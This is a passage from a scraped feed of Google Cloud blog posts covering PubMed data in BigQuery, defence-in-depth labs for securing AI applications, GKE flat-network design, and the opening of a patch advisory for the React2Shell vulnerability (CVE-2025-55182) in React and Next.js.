class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"results\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/results.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><h3>What’s next</h3><p>Complete end-to-end examples of agentic literature review are available at <a href=\"http://github.com/google/pubmed-rag\" target=\"_blank\">github.com/google/pubmed-rag</a>. These include methods for customizing ranking criteria with a points system and normalizing results using <a href=\"https://www.scimagojr.com/journalrank.php\" target=\"_blank\">Scimago Journal Impact</a> scores.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Screenshot 2025-12-03 at 1.41.58 PM\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Screenshot_2025-12-03_at_1.41.58PM.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Major organizations worldwide are already seeing transformative results. Gaurav Trivedi, Staff Engineer at Suki AI notes, \"This announcement signals a new era where datasets evolve from static files into building blocks for AI-ready applications.\"</p><p>By making PubMed data available in BigQuery with vector search capabilities, we're democratizing access to medical knowledge. A physician in a rural community now has the same ability to find relevant research as specialists at major academic medical centers. This aligns with NIH's mission to \"seek knowledge and apply it to enhance health, lengthen life, and reduce illness and disability.\"</p><p>Medical researchers and healthcare organizations can now leverage semantic search across full-text PubMed Central articles using <a href=\"https://cloud.google.com/bigquery\">BigQuery</a> and <a href=\"https://cloud.google.com/vertex-ai\">Vertex AI</a> to accelerate drug discovery, improve clinical decisions, and advance precision medicine. <i>To get started with PubMed data in BigQuery, visit</i> <a href=\"https://cloud.google.com/datasets\"><i>cloud.google.com/datasets</i></a>.</p><p>Catch the highlights from our recent <a href=\"https://cloudonair.withgoogle.com/events/public-sector-summit-2025\" target=\"_blank\">Google Public Sector Summit</a> where we shared how Google Cloud’s AI and data technologies can help advance your mission.</p></div>",
        "published_date": "2025-12-04 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/building-a-production-ready-ai-security-foundation/",
        "title": "Building a Production-Ready AI Security Foundation",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Blog_Hero_-_developing_agents_1.max-600x600.png",
        "author": "Aron Eidelman",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Scaling Generative AI applications from proof-of-concept to production is often bottlenecked by security concerns, specifically sensitive data exposure and prompt injection.</span></p>\n<p><span style=\"vertical-align: baseline;\">Establishing a production-ready posture requires a </span><strong style=\"vertical-align: baseline;\">defense-in-depth strategy</strong><span style=\"vertical-align: baseline;\"> across three layers:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Application Layer:</strong><span style=\"vertical-align: baseline;\"> Real-time threat detection and mitigation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data Layer:</strong><span style=\"vertical-align: baseline;\"> Enforcing privacy controls and compliance.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Infrastructure:</strong><span style=\"vertical-align: baseline;\"> Network segmentation and compute isolation.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To implement these controls, this guide details three hands-on labs focused on securing these specific architectural planes.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Protect the Application in Real-Time: Model Armor</span></h2>\n<p><span style=\"vertical-align: baseline;\">The application layer, where users directly interact with your AI model, is the </span><strong style=\"vertical-align: baseline;\">most exposed surface</strong><span style=\"vertical-align: baseline;\"> in a GenAI application. This surface is frequently targeted by attackers using prompts and responses to exploit vulnerabilities.</span></p>\n<p><span style=\"vertical-align: baseline;\">This lab focuses on securing the application and model layers by demonstrating how to deploy a comprehensive security service called </span><a href=\"https://docs.cloud.google.com/security-command-center/docs/model-armor-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Model Armor</strong></a><span style=\"vertical-align: baseline;\">. Model Armor acts as an intelligent firewall, analyzing prompts and responses in real-time to detect and block threats before they can cause harm.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this lab, you learn to mitigate critical risks, including:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Prompt injection &amp; jailbreaking:</strong><span style=\"vertical-align: baseline;\"> Malicious users crafting prompts to bypass safety guardrails or extract confidential data. You will create a Model Armor security policy that automatically detects and blocks these attempts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Malicious URL detection:</strong><span style=\"vertical-align: baseline;\"> Blocking users who embed dangerous links in prompts, which could be part of an indirect injection.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Sensitive data leakage:</strong><span style=\"vertical-align: baseline;\"> Preventing the model from inadvertently exposing Personally Identifiable Information (PII) in its responses.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">The Key Components:</strong></p>\n<p><span style=\"vertical-align: baseline;\">You will create reusable templates that define what Model Armor should analyze, detect, and block. The </span><code style=\"vertical-align: baseline;\">block-unsafe-prompts</code><span style=\"vertical-align: baseline;\"> template targets malicious inputs, while the </span><code style=\"vertical-align: baseline;\">data-loss-prevention</code><span style=\"vertical-align: baseline;\"> template prevents sensitive data from being exposed in prompts or responses.</span></p>\n<p><span style=\"vertical-align: baseline;\">After completing this lab, you will have the blueprint to integrate Model Armor directly into your application’s backend API, ensuring that every request to your model first passes through this real-time threat detection layer.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ec53fdf0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Safeguard AI Data with Sensitive Data Protection</span></h2>\n<p><span style=\"vertical-align: baseline;\">While the application layer needs real-time defense, the data used for training and testing AI models requires protection before it even enters the development environment. Raw customer data poses significant privacy challenges, and developers need high-quality data that is safe and compliant.</span></p>\n<p><span style=\"vertical-align: baseline;\">This lab guides you through building an </span><strong style=\"vertical-align: baseline;\">automated data sanitization pipeline</strong><span style=\"vertical-align: baseline;\"> to protect sensitive information used in AI development. You will use </span><a href=\"https://docs.cloud.google.com/sensitive-data-protection/docs/sensitive-data-protection-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud’s </span><strong style=\"text-decoration: underline; vertical-align: baseline;\">Sensitive Data Protection</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> (SDP) </span></a><span style=\"vertical-align: baseline;\">to inspect, classify, and de-identify Personally Identifiable Information (PII) across various data formats.</span></p>\n<p><strong style=\"vertical-align: baseline;\">The Key Components:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Inspection Templates:</strong><span style=\"vertical-align: baseline;\"> You define an inspection template to look for specific sensitive information types, or </span><strong style=\"vertical-align: baseline;\">infoTypes</strong><span style=\"vertical-align: baseline;\">, that are relevant to your data and geography, such as credit card numbers or SSNs.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">De-identification Templates:</strong><span style=\"vertical-align: baseline;\"> You build separate de-identification templates for different data formats, giving you granular control:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Unstructured Data:</strong><span style=\"vertical-align: baseline;\"> Replacing sensitive values in text files (like chat logs) with their </span><code style=\"vertical-align: baseline;\">infoType</code><span style=\"vertical-align: baseline;\"> name to preserve context.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Structured Data:</strong><span style=\"vertical-align: baseline;\"> Using record transformations like </span><strong style=\"vertical-align: baseline;\">character masking</strong><span style=\"vertical-align: baseline;\"> on CSV files to preserve data utility for testing while still de-identifying sensitive fields.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Image Data:</strong><span style=\"vertical-align: baseline;\"> Leveraging optical character recognition (OCR) to detect and redact sensitive text embedded within images.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automated Jobs:</strong><span style=\"vertical-align: baseline;\"> You configure a single job that </span><strong style=\"vertical-align: baseline;\">automatically applies the correct redaction</strong><span style=\"vertical-align: baseline;\"> based on the file type it detects and inspects, automating the security workflow for data stored in Cloud Storage.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In a production environment, you would use these templates to create a fully automated, hands-off detection and de-identification process, often by setting up a </span><strong style=\"vertical-align: baseline;\">job trigger</strong><span style=\"vertical-align: baseline;\"> whenever new raw customer data is uploaded. For sensitive data unique to your business, you can define </span><a href=\"https://cloud.google.com/sensitive-data-protection/docs/creating-custom-infotypes\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">custom infoTypes</strong></a><span style=\"vertical-align: baseline;\"> within Sensitive Data Protection.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ec854640&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Harden the AI Infrastructure Foundation</span></h2>\n<p><span style=\"vertical-align: baseline;\">The final layer of defense is the underlying infrastructure that hosts your development, training, and deployment processes. A production-ready AI environment must be isolated, hardened, and protected from system tampering, privilege escalation, and accidental data exposure.</span></p>\n<p><span style=\"vertical-align: baseline;\">This lab focuses on mitigating common infrastructure threats by creating a multi-layered, secure foundation.</span></p>\n<p><strong style=\"vertical-align: baseline;\">The Key Components:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Secure Network Foundation:</strong><span style=\"vertical-align: baseline;\"> You provision a secure </span><strong style=\"vertical-align: baseline;\">Virtual Private Cloud (VPC)</strong><span style=\"vertical-align: baseline;\"> and subnet, configured with </span><strong style=\"vertical-align: baseline;\">Private Google Access</strong><span style=\"vertical-align: baseline;\"> to ensure that compute resources can reach Google APIs over a private network, avoiding the public internet. You also deploy a </span><strong style=\"vertical-align: baseline;\">Cloud NAT gateway</strong><span style=\"vertical-align: baseline;\"> to allow private instances to initiate controlled outbound connections without having a public IP.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hardened Compute:</strong><span style=\"vertical-align: baseline;\"> You deploy a secure </span><strong style=\"vertical-align: baseline;\">Vertex AI Workbench instance</strong><span style=\"vertical-align: baseline;\"> inside your private VPC, which serves as your isolated development environment. You enforce the </span><strong style=\"vertical-align: baseline;\">principle of least privilege</strong><span style=\"vertical-align: baseline;\"> by creating and assigning a dedicated service account with only the necessary roles. The instance itself is hardened by disabling root access and enabling security features like </span><strong style=\"vertical-align: baseline;\">Secure Boot</strong><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Secure Storage:</strong><span style=\"vertical-align: baseline;\"> You create a fortified </span><strong style=\"vertical-align: baseline;\">Cloud Storage bucket</strong><span style=\"vertical-align: baseline;\"> for your datasets, models, and artifacts. You apply strong configurations, including:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enforce public access prevention</strong><span style=\"vertical-align: baseline;\"> to override any misconfigured IAM settings.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Uniform bucket-level access</strong><span style=\"vertical-align: baseline;\"> for simpler, more predictable control.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Object versioning</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">soft delete</strong><span style=\"vertical-align: baseline;\"> for recovery from accidental or malicious overwrites or deletions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data access logs</strong><span style=\"vertical-align: baseline;\"> to provide a comprehensive and immutable audit trail.</span></p>\n</li>\n</ul>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For maximum security, this entire environment can be wrapped in a </span><a href=\"https://cloud.google.com/vpc-service-controls/docs/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">VPC Service Controls</strong></a><span style=\"vertical-align: baseline;\"> perimeter, which prevents data exfiltration by ensuring services can only be accessed by authorized resources within your private network perimeter.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ec854b80&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Build Your Production-Ready AI Security Today</span></h2>\n<p><strong style=\"vertical-align: baseline;\">Ready to move your AI project from prototype to a secure, production-grade application?</strong><span style=\"vertical-align: baseline;\"> Dive into the codelabs now to begin your journey across the application, data, and infrastructure layers:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/4-securing-ai-applications/securing-ai-applications#0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">S</span><span style=\"text-decoration: underline; vertical-align: baseline;\">ecuring AI Applications</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/4-securing-ai-applications/securing-data-used-for-ai-applications#0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Securing Data Used for AI Applications</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/4-securing-ai-applications/securing-infrastructure-for-ai-applications#0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Securing Infrastructure for AI Applications</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">These labs are part of the </span><strong style=\"vertical-align: baseline;\">Securing AI Applications </strong><span style=\"vertical-align: baseline;\">module in our official </span><a href=\"https://cloud.google.com/blog/topics/developers-practitioners/production-ready-ai-with-google-cloud-learning-path?e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Production-Ready AI with Google Cloud</strong></a><span style=\"vertical-align: baseline;\"> program. Explore the full curriculum for more content that will help you bridge the gap from a promising prototype to a production-grade AI application.</span></p>\n<p><span style=\"vertical-align: baseline;\">Share your progress and connect with others on the journey using the hashtag </span><strong style=\"vertical-align: baseline;\">#ProductionReadyAI</strong><span style=\"vertical-align: baseline;\">. Happy learning!</span></p></div>",
        "published_date": "2025-12-04 10:53:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/unlocking-gkes-full-potential-the-flat-network-decoded/",
        "title": "Unlocking GKE’s Full Potential: The Flat Network Decoded",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/gke_hero.max-600x600.png",
        "author": "Whitney Jenkins",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As organizations adopt GKE for critical workloads, including generative and agentic AI, understanding GKE capabilities is essential. The networking layer is a key component, and while GKE offers a fully integrated, flat network model, you may be transitioning from different setups. It's important to grasp how GKE's network model differs and how to leverage its design.</span></p>\n<p><span style=\"vertical-align: baseline;\">The newly published </span><a href=\"https://services.google.com/fh/files/misc/gke_flat_network_design_recommendation.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">\"Unlocking the Power of GKE's Flat Network: Design Recommendation\"</span></a><span style=\"vertical-align: baseline;\"> offers a comprehensive guide to designing, deploying, and managing this network model. It dives into the key advantages of GKE's flat network, contrasts it with the alternative, island-mode, and provides architectural recommendations that can help you take advantage of its full potential for enhanced scalability, performance, and integration.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this blog post, take a peak into this design recommendation document. </span></p>\n<h2><span style=\"vertical-align: baseline;\">Use Case Recap</span></h2>\n<p><span style=\"vertical-align: baseline;\">Migrating to GKE offers agility and scalability for your containerized workloads, but we know users sometimes face challenges with IP address management, especially those accustomed to the \"island mode\" networking of other cloud providers. </span></p>\n<p><span style=\"vertical-align: baseline;\">While GKE's default flat network model doesn't natively support that \"island mode\" approach, there are ways to adapt your existing island-mode architectures to GKE’s flat networking architecture and navigate potential IP address management concerns. That's why we're providing clear strategies and showcasing GKE's latest feature to help you address IP management challenges and easily transition to GKE. </span></p>\n<h2><span style=\"vertical-align: baseline;\">Design Recommendation </span></h2>\n<p><span style=\"vertical-align: baseline;\">To help you along your journey the </span><a href=\"https://services.google.com/fh/files/misc/gke_flat_network_design_recommendation.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">“Unlocking the Power of GKE’s Flat Network: Design Recommendation\"</span></a><span style=\"vertical-align: baseline;\"> design guide provides in depth knowledge. This guide was written by several Google experts and dives into different patterns and designs based on various use cases. </span></p>\n<p><span style=\"vertical-align: baseline;\">The design guide is meant to serve as your main reference to assist you in evaluating all options and point you to reference architectures that describe how to deploy recommended patterns. You can utilize these recommendations as a guide, sample, or building blocks for designing, researching or planning your network. As with all things architecture, you have a varying degree of flexibility in what the final design will look like.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Example Pattern</span></h2>\n<p><span style=\"vertical-align: baseline;\">Let's take a quick look at one of the designs highlighted in the Unlocking the Power of GKE’s Flat Network: Design Recommendation.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"GKE_blog\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/GKE_blog.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This design outlines a strategy for emulating island mode behavior within GKE's flat network. It combines VPC-based island mode, which helps conserve IP addresses, with Private Service Connect (PSC) to access shared tooling. Network Connectivity Center (NCC) with PSC transitivity will provide access to common tooling through PSC endpoints, each having unique, routable IPs. For communication between these emulated \"islands,\" IP masquerading  will be used to map a Pod's IP address to its node's IP, making outbound Pod traffic appear to originate from the node. This comprehensive approach establishes a strong foundation for scalable and complex connectivity patterns.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Learn More Today</span></h2>\n<p><span style=\"vertical-align: baseline;\">You can learn more about GKE Networking with the following resources:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/network-overview?utm_campaign=CDR_0x4c813a5f_platform_b461652503&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Networking Overview</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/kubernetes-engine/docs/best-practices/networking?utm_campaign=CDR_0x4c813a5f_platform_b461652503&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Best Practices</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/gke-ip-address-mgmt-strategies?utm_campaign=CDR_0x4c813a5f_platform_b461652503&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Planning your Network</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/flexible-pod-cidr?utm_campaign=CDR_0x4c813a5f_platform_b461652503&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Configuring Max Pod per Node </span></a><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/how-class-e-addresses-solve-for-ip-address-exhaustion-in-gke?e=48754805%20&amp;utm_campaign=CDR_0x4c813a5f_platform_b461652503&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">How class E Addresses Solve for IP Address Exhaustion in GKE</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/avoiding-the-gke-ip_space_exhausted-error?e=48754805%20&amp;utm_campaign=CDR_0x4c813a5f_platform_b461652503&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Avoiding the GKE IP Space Exhausted Error</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-12-04 08:30:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/responding-to-cve-2025-55182/",
        "title": "Responding to CVE-2025-55182: Secure your React and Next.js workloads",
        "thumbnail": null,
        "author": "Emil Kiner",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor's note</strong><span style=\"font-style: italic; vertical-align: baseline;\">: This blog was updated on Dec. 7, 2025 at 9:10 p.m. PDT, to update the recommended syntax of the Cloud Armor WAF with an additional ruleID to help mitigate exploit attempts of CVE-2025-55182.</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor's note</strong><span style=\"font-style: italic; vertical-align: baseline;\">: This blog was updated on Dec. 5, 2025 at 12:40 p.m. PDT, to update the recommended syntax of the Cloud Armor WAF rule to detect and help mitigate exploit attempts of CVE-2025-55182.</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor's note</strong><span style=\"font-style: italic; vertical-align: baseline;\">: This blog was updated on Dec. 4, 2025 at 9:20 p.m. PDT, to revise the</span><span style=\"vertical-align: baseline;\"> </span><span style=\"font-style: italic; vertical-align: baseline;\">list of vulnerable versions of React Server Components and Next.js, and with updated configuration guidance for Cloud Armor.</span></p>\n<p><span><span style=\"vertical-align: baseline;\">Earlier today, Meta and Vercel publicly disclosed two vulnerabilities that expose services built using the popular open-source frameworks </span><strong style=\"vertical-align: baseline;\">React</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">Server Components</strong><span style=\"vertical-align: baseline;\"> (</span><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-55182\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2025-55182</strong></a><span style=\"vertical-align: baseline;\">) and </span><strong style=\"vertical-align: baseline;\">Next.js </strong><span style=\"vertical-align: baseline;\">to remote code execution risks when used for some server-side use cases. At Google Cloud, we understand the severity of these vulnerabilities, also known as </span><a href=\"https://react2shell.com/\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">React2Shell</span></a><span style=\"vertical-align: baseline;\">, and our security teams have shared their recommendations to help our customers take immediate, decisive action to secure their applications.</span></span></p>\n<h3><span style=\"vertical-align: baseline;\">Vulnerability background</span></h3>\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">React Server Components framework</strong><span style=\"vertical-align: baseline;\"> is commonly used for building user interfaces. On Dec. 3, 2025, </span><a href=\"http://cve.org\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE.org</span></a><span style=\"vertical-align: baseline;\"> assigned this vulnerability as </span><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-55182\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2025-55182</span></a><span style=\"vertical-align: baseline;\">. The official Common Vulnerability Scoring System (CVSS) base severity score has been determined as Critical, a severity of 10.0. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Vulnerable versions</strong><span style=\"vertical-align: baseline;\">: React 19.0, 19.1.0, 19.1.1, and 19.2.0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Patched</strong><span style=\"vertical-align: baseline;\"> in React 19.2.1</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Fix</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://github.com/facebook/react/commit/7dc903cd29dac55efb4424853fd0442fef3a8700\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://github.com/facebook/react/commit/7dc903cd29dac55efb4424853fd0442fef3a8700</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Announcement</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Next.js is a web development framework that depends on React, and is also commonly used for building user interfaces. (The Next.js vulnerability was referenced as </span><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-66478\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2025-66478</span></a><span style=\"vertical-align: baseline;\"> before being marked as a duplicate.)</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Vulnerable versions</strong><span style=\"vertical-align: baseline;\">: Next.js 15.x, Next.js 16.x, Next.js 14.3.0-canary.77 and later canary releases</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Patched</strong><span style=\"vertical-align: baseline;\"> versions are listed </span><a href=\"https://nextjs.org/blog/CVE-2025-66478#required-action\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Fix</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://github.com/vercel/next.js/commit/6ef90ef49fd32171150b6f81d14708aa54cd07b2\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://github.com/vercel/next.js/commit/6ef90ef49fd32171150b6f81d14708aa54cd07b2</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Announcement</strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://nextjs.org/blog/CVE-2025-66478\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://nextjs.org/blog/CVE-2025-66478</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We strongly encourage organizations who manage environments relying on the React and Next.js frameworks to update to the latest version, and take the mitigation actions outlined below.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Mitigating CVE-2025-55182</span></h3>\n<p><span style=\"vertical-align: baseline;\">We have created and rolled out a new </span><strong style=\"vertical-align: baseline;\">Cloud Armor web application firewall (WAF) rule</strong><span style=\"vertical-align: baseline;\"> designed to detect and block exploitation attempts related to CVE-2025-55182. This new rule is </span><strong style=\"vertical-align: baseline;\">available now</strong><span style=\"vertical-align: baseline;\"> and is intended to help protect your internet-facing applications and services that use global or regional Application Load Balancers. We recommend deploying this rule as a temporary mitigation while your vulnerability management program patches and verifies all vulnerable instances in your environment.</span></p>\n<p><span 